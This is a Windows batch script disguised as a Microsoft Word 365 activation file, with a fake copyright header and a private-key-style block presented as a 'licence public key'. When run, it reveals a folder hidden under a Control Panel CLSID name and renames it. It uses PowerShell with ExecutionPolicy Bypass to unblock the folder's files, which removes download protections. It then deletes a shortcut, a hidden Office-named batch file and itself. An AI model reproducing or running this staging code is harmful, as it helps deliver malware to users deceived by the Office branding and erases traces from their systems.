/*
Activation: Microsoft Word 365 is activated with a digital licence linked to Microsoft account
®™COPYRIGHTS MICROSOFT: All rights reserved
Version : 2014
OS build: 19034
This is not an upgradable edition

-----BEGIN LICENCE PUBLIC KEY-----
MIICXAIBAAKBgQCoRqL06vWn/GylB1rNEjR41cxE22M/eVRGjwx4dmDnCSTCFx7L
QET+whfPGwh631UglLbJc+eYonNm3SNPW4EikfkoJXtzuq9k/ESp+rGYwQzY2Iz4
hyiVoVCUDMZVWbjqKfB/xwHMwuqPvjaF9JSeJfBzPWOP33FtADMXs/bnzwIDAQAB
AoGBAKYWmg6cvfyhA+ba3H9eAZZmhyhLVak3qru9wzQ+uyQt/S7ovQcllzPQBMnw
x6znM9Fllwg9MxCO/tI/X/OawFfvGVSfEezs7CwkI9860teOEjnA3Vp0+iCN7ny9
eR5uq7WZ9oIh8i0vatNEY2cZtZyFgKHboba4ptIcmwqs/JFRAkEA6bvmK00yTQju
lPhZvC6BiuAKfFtsMFmZG+30B4bfzfdMzFDasB2C3RMgWNc47wHudCE8chOIqICy
0sRYsHppmQJBALhOZ0CxGmYPIUcB9bTZZbxK3HHsrhWn0cpHmoYDpdBrupcZmWWR
hJ5zGi7kh2mQXcBMOP1Yx/VL+LryAxbBTacCQA11spV/xovFHegaPSCnFPKoYDI1
GY/XOQfwtgLQ84Zq3VNOvKkzqduNRGmZS0AIPnEVkOOI2G/LqYCVqf3PrtECQBgH
IK7uZ+KmVlBLkRziusCxgcvYb1mjZ1ZXv215TES/xrOsQrNbJU8C8obqhDze9Vn8
lfFxgaAZJ3Q32O8+hEECQHA/g0BZc1p5WOW9fUfP0Shi1xqjAwVdtmnOsI+cdLW7
E/52Po9K7nzHSQAn+CniajvEYjuxpDwzWi4PRfSuQro=
-----END LICENCE PUBLIC KEY-----
*/

@ECHO OFF
if EXIST "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" goto UNLOCK
:UNLOCK
attrib -h -s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
ren "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" Documentation
Powershell.exe -ExecutionPolicy Bypass -Command "dir .\Documentation\* | Unblock-File
del /Q Documentation.lnk
del /ah /Q Microsoft-Office365.bat
del %0
goto End
:End
